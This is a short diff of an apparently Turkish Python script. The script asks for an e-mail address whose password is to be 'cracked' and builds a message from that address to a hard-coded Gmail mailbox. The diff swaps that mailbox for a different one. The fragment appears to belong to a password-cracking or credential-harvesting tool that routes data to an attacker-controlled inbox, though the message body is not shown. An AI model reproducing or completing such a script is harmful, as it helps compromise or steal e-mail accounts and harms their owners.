@@ -16,7 +16,7 @@ E_posta = input("Şifresi kırılacak E-posta'yı girin: ")
 
 mesaj["From"] = E_posta
 
-mesaj["To"] = "hack.dene018@gmail.com"
+mesaj["To"] = "sifrekirsifre@gmail.com"
 
 mesaj["Subject"] = "aa"
 
